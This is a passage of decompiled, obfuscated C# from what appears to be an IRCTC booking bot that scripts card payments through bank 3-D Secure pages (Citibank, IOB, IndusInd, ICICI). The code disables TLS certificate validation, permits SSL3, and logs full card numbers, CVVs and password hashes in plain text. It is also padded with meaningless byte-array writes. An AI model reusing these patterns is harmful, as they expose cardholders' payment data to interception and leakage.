                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text = "";
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    HttpRequestCachePolicy httpRequestCachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    httpWebRequest.Timeout = int_28;
                    httpWebRequest.ReadWriteTimeout = int_29;
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    if (cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
                    httpWebRequest.ContentType = multipart;
                    httpWebRequest.Accept = "*/*";
                    httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
                    httpWebRequest.AllowWriteStreamBuffering = true;
                    httpWebRequest.AllowAutoRedirect = true;
                    if (!string.IsNullOrEmpty(string_87))
                    {
                        httpWebRequest.Method = "POST";
                        byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                        httpWebRequest.ContentLength = bytes.Length;
                        httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if ((httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text = (string_5 = httpWebResponse.GetResponseHeader("Location"));
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text;
                    num3 = 1;
                    clsMain.Lock("Getting Html out= " + text);
                    break;
                }
                catch (WebException ex)
                {
                    num3 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag2 = ex.Response != null;
                    string text2 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag2)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text2 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text2 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                    continue;
                }
                catch (Exception ex2)
                {
                    num3 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num3 != 0;
        }

        internal bool method_167(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            string string_92 = "";
            string string_93 = string_86;
            clsMain.Lock("Enter ProcessCC_CITIPG.");
            string string_94 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string string_95 = array[0].Trim();
            string text = array[1];
            string text2 = array[2];
            string string_96 = array[3];
            string string_97 = array[4];
            string text3 = array[5];
            string string_98 = array[7];
            string string_99 = "";
            CookieContainer cookieContainer_ = null;
            string text4 = class3_0.Method_SerialInp(string_86, ref string_99, false);
            bool flag = text3.ToUpper()[0] != 'M';
            if (text.Length < 2)
            {
                text = "0" + text;
            }
            try
            {
                bool flag2 = false;
                clsMain.Lock("First Hit Inp = " + text4);
                if (!_Request(string_99, text4, string_94, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_91 = "CC Gateway not working - Payment Failed";
                    return false;
                }
                clsMain.Lock("First Output htm = " + string_93);
                string_94 = string_99;
                string string_100 = string_93.Substring(string_93.IndexOf("<form name=\"backendDetails\""));
                string string_101 = class3_0.Method_SerialInp(string_100, ref string_99, false);
                string_99 = "https://www.citibank.co.in/servlets/PgTransResp_Web";
                text4 = clsPostData.SetPost(clsPostData.SetPost(clsPostData.SetPost(clsPostData.SetPost(clsPostData.SetPost(clsPostData.SetPost(clsPostData.SetPost(clsPostData.SetPost(string_101, "HtmlCardNum", string_95), "HtmlCVVNum", string_97), "HtmlMonth", text), "HtmlYear", text2.Substring(2, 2)), "HtmlIPinSelect", "0"), "ftermsval", "Other"), "HtmlCardType", "OC"), "DirectModel", "0");
                clsMain.Lock("Second Hit Inp = " + text4);
                if (!_Request(string_99, text4, string_94, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("Second Hit Failed. err = " + string_92);
                    string_91 = "CC Gateway not working - Payment Failed";
                    return false;
                }
                clsMain.Lock("Second Output htm = " + string_93);
                if (string_93.Contains("servlets/PgTransResp_Web"))
                {
                    string_94 = string_99;
                    text4 = "";
                    if (!_Request(string_99, text4, string_94, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_92);
                        string_91 = "CC Gateway not working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("Second Output htm = " + string_93);
                }
                string_94 = string_93.Substring(string_93.IndexOf("action=") + 7);
                string_94 = string_94.Substring(0, string_94.IndexOf(">"));
                string string_102 = class3_0.Method_SerialInp(string_93, ref string_99, false);
                string_93 = method_168(string_94, string_102);
                if (string_93.IndexOf("netsafe.hdfcbank.com") > 0)
                {
                    flag2 = method_174(string_93, string_87, cookieContainer_, string_98, ref string_93, ref string_91);
                }
                else if (string_93.IndexOf("hdfc-acs.wibmo.com") <= 0)
                {
                    if (string_93.IndexOf("secure4.arcot.com") > 0)
                    {
                        flag2 = method_178(ref string_93, string_99, cookieContainer_, string_98, ref string_91);
                    }
                    else if (string_93.IndexOf("airtelbank") <= 0 && string_93.IndexOf("udioforyou") <= 0 && !string_88.Contains("AXIS"))
                    {
                        if (string_88.Contains("ICICI"))
                        {
                            flag2 = method_172(ref string_93, string_99, cookieContainer_, string_96, ref string_91);
                        }
                        else if (!string_88.Contains("INDU") && !string_88.Contains("ITZ") && (string_88.Contains("IOB") || string_88.Contains("BOB") || string_88.Contains("CANARA")) && string_93.Contains("Invalid Credentials. Please try again."))
                        {
                            string_91 = "Invalid Credentials. Please try again.";
                            clsMain.Lock(string_88 + " Failed strerr = " + string_91);
                            return false;
                        }
                    }
                }
                if (flag2)
                {
                    text4 = class3_0.Method_SerialInp(string_93, ref string_99, false);
                    string_94 = string_91;
                    clsMain.Lock("Third Hit Inp = " + text4);
                    if (!_Request(string_99, text4, string_94, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                    {
                        clsMain.Lock("Third Hit Failed. err = " + string_92);
                        string_91 = "Gateway Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("Third Output htm = " + string_93);
                    if (string_93.IndexOf("www.irctc.co.in/eticketing/BankResponse", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        clsMain.Lock("Success ProcessCC_AxisPG");
                        string text5 = string_93.Substring(string_93.IndexOf("CititoMall.value='") + 18);
                        text5 = text5.Substring(0, text5.IndexOf("'"));
                        string text6 = string_93.Substring(string_93.IndexOf("CitiPGtoMall.value='") + 20);
                        text6 = text6.Substring(0, text6.IndexOf("'"));
                        string_93 = string_93.Replace("action=\"\"", "action=\"https://www.irctc.co.in/eticketing/BankResponse\"");
                        string_93 = (string_90 = string_93.Replace("CititoMall\" value=''", "CititoMall\" value=\"" + text5 + "\"").Replace("CitiPGtoMall\" value=''", "CitiPGtoMall\" value=\"" + text6 + "\""));
                        string_91 = string_99;
                        return true;
                    }
                    string_91 = "Error Occured while Making Payment!";
                    clsMain.Lock(string_91 + ", Check HTML");
                    return false;
                }
                clsMain.Lock(string_88 + " Failed strerr = " + string_91);
                return false;
            }
            catch (Exception ex)
            {
                clsMain.method_74("ProcessCC_CitiPG", ex.Message);
                return false;
            }
        }

        public string method_168(string string_86, string string_87)
        {
            string text = "";
            string result = "";
            try
            {
                if (!string.IsNullOrEmpty(string_87))
                {
                    string[] array = Strings.Split(string_87, "&");
                    int num = Information.UBound(array);
                    for (int i = 0; i <= num; i++)
                    {
                        string[] array2 = Strings.Split(array[i], "=");
                        text = text + "<input type=\"hidden\" name=\"" + array2[0] + "\" value=\"" + array2[1] + "\" />";
                    }
                }
                result = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en-IN\"><head><script type=\"text/javascript\" src=\"/eticketing/javax.faces.resource/scommon.js.jsf?ln=js\"></script><script type=\"text/javascript\">\t\t\t\tcheckUId(\"10599\");\t\t\t</script><script type=\"text/javascript\">\t\t\t\tsetRId(\"1520332067667\");\t\t\t</script><link type=\"text/css\" rel=\"stylesheet\" href=\"/eticketing/org.richfaces.resources/javax.faces.resource/org.richfaces.staticResource/4.2.3.Final/PackedCompressed/blueSky/skinning.css\" /></head><body><form action=\"" + string_86 + "\" method=\"POST\">" + text + "</form>     <center><font size=\"5\" color=\"#3b4455\">Transaction is being processed<br />Please wait ...</font></center> <script type=\"text/javascript\">\tdocument.forms[0].submit();</script></body></html>";
                return result;
            }
            catch
            {
                return result;
            }
        }

        private bool method_170(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string string_91 = "";
            string text = string_86;
            clsMain.Lock("Enter ProcessIOBCC.");
            string string_92 = "";
            string text2 = class3_0.Method_SerialInp(string_86, ref string_90, false);
            string string_93 = "";
            clsMain.Lock("First Hit URL = " + string_90 + " Inp = " + text2);
            if (!_Request(string_90, text2, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
            {
                string_91 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                clsMain.Lock("First Hit Failed. err = " + string_91);
                return false;
            }
            clsMain.Lock("First Hit Output = " + string_93);
            text = string_93;
            if (text.IndexOf("Enter your password", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                string_89 = "Error Occured while Making Payment!";
                clsMain.Lock(string_89 + ", Check HTML");
                return false;
            }
            int startIndex = text.IndexOf("var saltx");
            startIndex = text.IndexOf("\"", startIndex) + 1;
            int length = text.IndexOf("\"", startIndex) - startIndex;
            string text3 = text.Substring(startIndex, length);
            startIndex = text.IndexOf("ACTION=");
            startIndex = text.IndexOf("\"", startIndex) + 1;
            length = text.IndexOf("\"", startIndex) - startIndex;
            string text4 = text.Substring(startIndex, length);
            startIndex = text.IndexOf("XID", startIndex);
            startIndex = text.IndexOf("value", startIndex);
            startIndex = text.IndexOf("\"", startIndex) + 1;
            length = text.IndexOf("\"", startIndex) - startIndex;
            string str = text.Substring(startIndex, length);
            startIndex = text.IndexOf("txtLogin", startIndex);
            startIndex = text.IndexOf("VALUE", startIndex);
            startIndex = text.IndexOf("\"", startIndex) + 1;
            length = text.IndexOf("\"", startIndex) - startIndex;
            string_92 = text.Substring(startIndex, length);
            text2 = Class12.smethod_16(string_88, true).ToLower();
            string_93 = Class12.smethod_16(text2 + text3, true).ToLower();
            string text5 = "XID=" + HttpUtility.UrlEncode(str) + "&txtLogin=" + string_92 + "&txtPassword=" + string_93 + "&hash=" + text2 + "&cmdSubmit=Submit";
            string_87 = string_90;
            string_90 = "https://cardsecurity.enstage.com" + text4;
            clsMain.Lock("Second Hit URL = " + string_90 + " Inp = " + text5);
            if (!_Request(string_90, text5, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref text, ref string_91, ref webException_0))
            {
                string_89 = "Failed after Payment, Check Status.";
                clsMain.Lock("Second Hit Failed. err = " + string_91);
                return false;
            }
            clsMain.Lock("Second Hit Output = " + text);
            if (text.IndexOf("Your transaction is being processed", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                string_89 = "Error Occured while Making Payment!";
                clsMain.Lock(string_89 + ", Check HTML");
                return false;
            }
            clsMain.Lock("Success ProcessIOBCC");
            string_86 = text;
            string_89 = string_90;
            return true;
        }

        private bool method_171(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89, string string_90)
        {
            string string_91 = "";
            string string_92 = string_86;
            clsMain.Lock("Enter ProcessInduCC.");
            string string_93 = "";
            string text = class3_0.Method_SerialInp(string_86, ref string_92, false);
            string string_94 = "";
            clsMain.Lock("First Hit URL = " + string_92 + " Inp = " + text);
            if (!_Request(string_92, text, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
            {
                string_91 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                clsMain.Lock("First Hit Failed. err = " + string_91);
                return false;
            }
            clsMain.Lock("First Hit Output = " + string_94);
            string_92 = string_94;
            if (string_92.IndexOf("Transaction Password", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                byte[] array = new byte[284];
                string text2 = "6\u0013Äö\u007f";
                for (int i = 0; i < text2.Length; i++)
                {
                    array[i + 93] = (byte)text2[i];
                }
                array[106] = 95;
                array[109] = 162;
                array[160] = 23;
                string_93 = "Error Occured while Making Payment!";
                array[102] = 2;
                array[104] = 19;
                string_89 = string_93;
                array[105] = 162;
                array[159] = 60;
                array[101] = 16;
                string text3 = string_89;
                string text4 = ", Check HTML";
                array[107] = 118;
                string string_95 = text3 + text4;
                array[98] = 153;
                array[108] = 67;
                clsMain.Lock(string_95);
                text = "¢\u008bH¿«\u0098_Á\u009d8\u0098£y! \0\0\0\u00a0Â¦P<­ðnr®ñ\u008d'»êFM-åêÔ8\u008fË¾D>õõ\u008e";
                for (int j = 0; j < text.Length; j++)
                {
                    array[j + 111] = (byte)text[j];
                }
                array[99] = 127;
                array[103] = 6;
                array[110] = 196;
                array[100] = 211;
                return false;
            }
            int startIndex = string_92.IndexOf("var acsCookie");
            startIndex = string_92.IndexOf("\"", startIndex) + 1;
            int length = string_92.IndexOf("\"", startIndex) - startIndex;
            string str = string_92.Substring(startIndex, length);
            startIndex = string_92.IndexOf("var vsdcInput");
            startIndex = string_92.IndexOf("\"", startIndex) + 1;
            length = string_92.IndexOf("\"", startIndex) - startIndex;
            string str2 = string_92.Substring(startIndex, length);
            startIndex = string_92.IndexOf("var userPan");
            startIndex = string_92.IndexOf("\"", startIndex) + 1;
            length = string_92.IndexOf("\"", startIndex) - startIndex;
            string_94 = string_92.Substring(startIndex, length);
            string text5 = "static=static&" + string_90 + "&submitted=1&authType=Visa+Password&cancelHit=0&forgotPassword=0&cardHolder=&Userid=&authDefaultSelect=Visa+Password&AuthFallBack=&Phase=passwd&tryIndex=1&pin=ToStatic%7Een_US&ARCOTC=&ARCOTR=&Locale=GenericOTP_INDUSINDBANK_LANDING%2F&RFIncreaseAuthAction=0&RFIsSecAuthPresentForIncreaseAuth=0&CookieType=0&VSDCInput=" + HttpUtility.UrlEncode(str2) + "&VSDCData=&ChipPluginName=&ChipPluginVersion=&ChipPluginPresent=TRUE&eAccessPresent=FALSE&eAccessRequired=FALSE&ChipSecret=&AcsCookie=" + HttpUtility.UrlEncode(str) + "&DeviceID=&ABSlog=GPP&deviceDNA=&executionTime=&dnaError=&mesc=&mescIterationCount=0&desc=&isDNADone=false&arcotFlashCookie=&pan=" + string_94.Replace(' ', '+') + "&CustData=en_US";
            clsMain.Lock("Second Hit URL = " + string_87 + " Inp = " + text5);
            if (!_Request(string_87, text5, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
            {
                byte[] array2 = new byte[327];
                array2[101] = 16;
                array2[102] = 2;
                string text6 = "\u0013¢_vC¢Ä¢\u008bH¿«\u0098_Á\u009d8\u0098£y! \0\0\0\u00a0Â¦P<­ðnr®ñ\u008d'»êFM-åêÔ8\u008fË¾D>õõ";
                for (int k = 0; k < text6.Length; k++)
                {
                    array2[k + 104] = (byte)text6[k];
                }
                array2[93] = 54;
                string text7 = "\u0013Äö\u007f\u0099\u007f";
                for (int l = 0; l < text7.Length; l++)
                {
                    array2[l + 94] = (byte)text7[l];
                }
                string text8 = "Failed after Payment, Check Status.";
                array2[103] = 6;
                string_89 = text8;
                array2[158] = 142;
                string text9 = "Second Hit Failed. err = ";
                array2[159] = 60;
                string string_96 = text9 + string_91;
                array2[160] = 23;
                array2[100] = 211;
                clsMain.Lock(string_96);
                return false;
            }
            clsMain.Lock("Second Hit Output = " + string_92);
            if (string_92.IndexOf("Secured Online Shopping", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                byte[] array3 = new byte[229];
                string text10 = "6\u0013Äö\u007f\u0099";
                for (int m = 0; m < text10.Length; m++)
                {
                    array3[m + 93] = (byte)text10[m];
                }
                string text11 = "\u008fË¾D>õõ";
                for (int n = 0; n < text11.Length; n++)
                {
                    array3[n + 151] = (byte)text11[n];
                }
                array3[158] = 142;
                string text12 = "Error Occured while Making Payment!";
                array3[102] = 2;
                array3[150] = 56;
                string_89 = text12;
                string text13 = "<­ðnr®ñ\u008d'»êFM-åê";
                for (int num = 0; num < text13.Length; num++)
                {
                    array3[num + 133] = (byte)text13[num];
                }
                array3[149] = 212;
                array3[160] = 23;
                string text14 = string_89;
                string text15 = ", Check HTML";
                array3[101] = 16;
                clsMain.Lock(text14 + text15);
                string text16 = "\u0006\u0013¢_vC¢Ä¢\u008bH¿«\u0098_Á\u009d8\u0098£y! \0\0\0\u00a0Â¦P";
                for (int num2 = 0; num2 < text16.Length; num2++)
                {
                    array3[num2 + 103] = (byte)text16[num2];
                }
                array3[99] = 127;
                array3[159] = 60;
                array3[100] = 211;
                return false;
            }
            string text17 = string_92;
            byte[] array4 = new byte[313];
            array4[123] = 121;
            string value = "AcsCookie";
            array4[96] = 246;
            int num3 = text17.IndexOf(value, startIndex);
            array4[153] = 190;
            array4[99] = 127;
            startIndex = num3;
            int num4 = string_92.IndexOf("value", startIndex);
            array4[94] = 19;
            startIndex = num4;
            string text18 = string_92;
            string value2 = "\"";
            array4[125] = 32;
            int startIndex2 = startIndex;
            array4[154] = 68;
            int num5 = text18.IndexOf(value2, startIndex2);
            array4[158] = 142;
            int num6 = num5 + 1;
            array4[156] = 245;
            startIndex = num6;
            array4[155] = 62;
            string text19 = string_92;
            array4[133] = 60;
            length = text19.IndexOf("\"", startIndex) - startIndex;
            string text20 = string_92;
            array4[93] = 54;
            str = text20.Substring(startIndex, length);
            string[] array5 = new string[9];
            array4[134] = 173;
            array5[0] = "pin=&submitted=0&authType=Visa+Password&cancelHit=0&forgotPassword=0&cardHolder=&Userid=&authDefaultSelect=Visa+Password&AuthFallBack=&Phase=passwd&tryIndex=2&";
            array4[127] = 0;
            array5[1] = string_90;
            string text21 = "&ARCOTC=&ARCOTR=&Locale=en_US_Indus_Visa%2F&RFInreaseAuthAction=0&RFIsEMailPresentForIncreaseAuth=&CookieType=0&VSDCInput=";
            array4[129] = 160;
            array5[2] = text21;
            array5[3] = HttpUtility.UrlEncode(str2);
            string text22 = "&VSDCData=&ChipPluginName=&ChipPluginVersion=&ChipPluginPresent=TRUE&eAccessPresent=FALSE&eAccessRequired=FALSE&ChipSecret=&AcsCookie=";
            array4[157] = 245;
            array5[4] = text22;
            array5[5] = HttpUtility.UrlEncode(str);
            array4[159] = 60;
            string text23 = "&DeviceID=&SecAuth=";
            array4[124] = 33;
            array5[6] = text23;
            array5[7] = HttpUtility.UrlEncode(string_88);
            string text24 = "&CustData=STATIC";
            array4[132] = 80;
            array5[8] = text24;
            array4[122] = 163;
            string text25 = string.Concat(array5);
            array4[128] = 0;
            text5 = text25;
            clsMain.Lock("Third Hit URL = " + string_87 + " Inp = " + text5);
            string text26 = "ðnr®ñ\u008d'»êFM-åêÔ8\u008f";
            for (int num7 = 0; num7 < text26.Length; num7++)
            {
                array4[num7 + 135] = (byte)text26[num7];
            }
            string string_97 = text5;
            array4[130] = 194;
            array4[131] = 166;
            WebProxy webProxy_ = webProxy_3;
            array4[126] = 0;
            array4[152] = 203;
            array4[98] = 153;
            array4[95] = 196;
            array4[97] = 127;
            array4[160] = 23;
            if (!_Request(string_87, string_97, string_87, webProxy_, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
            {
                string text27 = "\u0010\u0002\u0006\u0013¢_vC¢Ä";
                for (int num8 = 0; num8 < text27.Length; num8++)
                {
                    array4[num8 + 101] = (byte)text27[num8];
                }
                string text28 = "H¿«\u0098_";
                for (int num9 = 0; num9 < text28.Length; num9++)
                {
                    array4[num9 + 113] = (byte)text28[num9];
                }
                array4[124] = 33;
                array4[126] = 0;
                string text29 = "Failed after Payment, Check Status.";
                array4[120] = 56;
                string_89 = text29;
                array4[121] = 152;
                string text30 = "Third Hit Failed. err = ";
                array4[112] = 139;
                string string_98 = text30 + string_91;
                array4[111] = 162;
                array4[118] = 193;
                clsMain.Lock(string_98);
                array4[119] = 157;
                array4[125] = 32;
                array4[100] = 211;
                return false;
            }
            clsMain.Lock("Third Hit Output = " + string_92);
            if (string_92.IndexOf("document.downloadForm.submit", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                string text31 = "\u0013¢_vC¢Ä¢";
                for (int num10 = 0; num10 < text31.Length; num10++)
                {
                    array4[num10 + 104] = (byte)text31[num10];
                }
                array4[115] = 171;
                array4[101] = 16;
                array4[125] = 32;
                array4[120] = 56;
                string_89 = "Error Occured while Making Payment!";
                array4[103] = 6;
                array4[124] = 33;
                array4[112] = 139;
                array4[116] = 152;
                string text32 = string_89;
                array4[119] = 157;
                string text33 = ", Check HTML";
                array4[121] = 152;
                string string_99 = text32 + text33;
                array4[102] = 2;
                array4[126] = 0;
                clsMain.Lock(string_99);
                array4[113] = 72;
                array4[114] = 191;
                array4[117] = 95;
                array4[118] = 193;
                array4[100] = 211;
                return false;
            }
            array4[120] = 56;
            string text34 = string_92;
            array4[121] = 152;
            string text35 = string_92;
            array4[115] = 171;
            string text36 = text34.Substring(text35.IndexOf("name=\"downloadForm"));
            array4[117] = 95;
            string_92 = text36;
            array4[114] = 191;
            array4[116] = 152;
            clsMain.Lock("Success ProcessInduCC");
            string text37 = "\u0010\u0002\u0006\u0013¢_vC¢Ä¢\u008bH";
            for (int num11 = 0; num11 < text37.Length; num11++)
            {
                array4[num11 + 101] = (byte)text37[num11];
            }
            string text38 = string_92;
            array4[124] = 33;
            string_86 = text38;
            array4[125] = 32;
            array4[119] = 157;
            string_89 = string_87;
            array4[118] = 193;
            array4[126] = 0;
            array4[100] = 211;
            return true;
        }

        private bool method_172(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string text = string_86;
            clsMain.Lock("Enter ProcessIciciCC.");
            string string_91 = "";
            string text2 = class3_0.Method_SerialInp(string_86, ref string_90, false);
            string string_92 = "";
            clsMain.Lock("First Hit URL = " + string_90 + " Inp = " + text2);
            if (!_Request(string_90, text2, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
            {
                string text3 = cookieContainer_2?.ToString() + " Gateway not working - Payment Failed";
                clsMain.Lock("First Hit Failed. err = " + text3);
                return false;
            }
            clsMain.Lock("First Hit Output = " + string_92);
            text = string_92;
            if (text.IndexOf("Please enter your", StringComparison.CurrentCultureIgnoreCase) <= 0)
            {
                byte[] array = new byte[237];
                array[126] = 118;
                string_91 = "Error Occured while Making Payment!";
                array[61] = 141;
                array[99] = 59;
                array[100] = 42;
                string_89 = string_91;
                array[96] = 0;
                array[63] = 68;
                array[67] = 3;
                array[68] = 210;
                array[122] = 150;
                array[66] = 242;
                string text4 = string_89;
                array[65] = 123;
                array[98] = 93;
                array[128] = 138;
                string text5 = ", Check HTML";
                array[95] = 0;
                array[64] = 133;
                array[97] = 151;
                string string_93 = text4 + text5;
                array[123] = 66;
                array[124] = 7;
                array[125] = 140;
                array[127] = 129;
                array[69] = 134;
                clsMain.Lock(string_93);
                array[87] = 221;
                array[70] = 254;
                array[80] = 114;
                array[62] = 95;
                array[71] = 78;
                return false;
            }
            text2 = clsMain.smethod_8(text, "name=\"cancelHit", "</FORM>", false);
            int startIndex = text.IndexOf("var calloutmsg");
            startIndex = text.IndexOf("\"", startIndex) + 1;
            int length = text.IndexOf("\"", startIndex) - startIndex;
            string str = text.Substring(startIndex, length) + "~undefined";
            string_92 = "pin=" + string_88 + "&otpPassword=&submitted=1&authType=Visa+Password&cancelHit=0&" + text2 + HttpUtility.UrlEncode(str);
            clsMain.Lock("Second Hit URL = " + string_87 + " Inp = " + string_92);
            byte[] array2 = new byte[238];
            if (!_Request(string_87, string_92, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref text, ref string_90, ref webException_0))
            {
                array2[63] = 68;
                string_89 = "Failed after Payment, Check Status.";
                array2[128] = 138;
                string text6 = "Second Hit Failed. err = ";
                string text7 = string_90;
                array2[62] = 95;
                string string_94 = text6 + text7;
                array2[70] = 254;
                array2[61] = 141;
                array2[71] = 78;
                clsMain.Lock(string_94);
                return false;
            }
            array2[63] = 68;
            string text8 = "Second Hit Output = ";
            array2[61] = 141;
            array2[126] = 118;
            string text9 = text;
            array2[125] = 140;
            string string_95 = text8 + text9;
            array2[123] = 66;
            array2[127] = 129;
            clsMain.Lock(string_95);
            array2[105] = 44;
            string text10 = text;
            array2[124] = 7;
            array2[115] = 49;
            array2[70] = 254;
            string value = "document.downloadForm.submit";
            array2[114] = 30;
            array2[62] = 95;
            array2[128] = 138;
            array2[116] = 112;
            int num = text10.IndexOf(value, StringComparison.CurrentCultureIgnoreCase);
            array2[104] = 61;
            array2[72] = 118;
            if (num <= 0)
            {
                array2[102] = 80;
                array2[119] = 7;
                array2[78] = 75;
                string_89 = "Error Occured while Making Payment!";
                array2[117] = 252;
                array2[99] = 59;
                array2[104] = 61;
                array2[121] = 9;
                array2[122] = 150;
                string text11 = string_89;
                array2[77] = 90;
                string text12 = ", Check HTML";
                array2[76] = 95;
                array2[103] = 94;
                string string_96 = text11 + text12;
                array2[101] = 46;
                clsMain.Lock(string_96);
                array2[79] = 36;
                array2[100] = 42;
                array2[120] = 68;
                array2[118] = 208;
                array2[71] = 78;
                return false;
            }
            array2[81] = 26;
            array2[98] = 93;
            string text13 = text;
            array2[120] = 68;
